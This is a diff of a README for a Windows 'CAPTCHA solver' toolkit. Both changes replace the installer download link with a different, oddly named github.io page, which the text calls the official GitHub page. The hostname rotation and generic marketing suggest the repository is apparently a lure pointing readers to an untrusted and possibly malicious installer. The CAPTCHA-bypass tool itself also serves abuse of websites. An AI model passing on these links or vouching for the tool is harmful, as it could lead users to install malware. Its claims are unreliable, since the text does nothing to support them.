@@ -2,7 +2,7 @@
 
 AutoCaptchaSolver Pro Toolkit 2026 is a comprehensive Windows desktop application designed to automate CAPTCHA solving with cutting-edge OCR technology and seamless multi-service API support. This tool enables users to handle various CAPTCHA types efficiently, making it ideal for developers and power users seeking to streamline workflows in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## System Requirements
 
@@ -70,7 +70,7 @@ A: Yes, the batch processing mode allows you to queue multiple CAPTCHAs for simu
 
 To start using AutoCaptchaSolver Pro Toolkit 2026, download the installer from the official GitHub page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
